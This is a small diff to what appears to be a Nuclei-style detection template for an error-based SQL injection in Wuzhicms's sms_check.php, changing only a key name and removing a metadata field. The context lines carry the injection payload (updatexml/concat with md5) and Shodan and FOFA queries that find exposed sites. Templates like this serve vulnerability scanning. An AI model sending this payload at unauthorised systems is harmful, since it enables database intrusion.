@@ -14,7 +14,6 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-89
   metadata:
-    max-request: 1
     verified: true
     shodan-query: http.html:"Wuzhicms"
     fofa-query: title="Wuzhicms"
@@ -23,7 +22,7 @@ info:
 variables:
   num: "999999999"
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20"
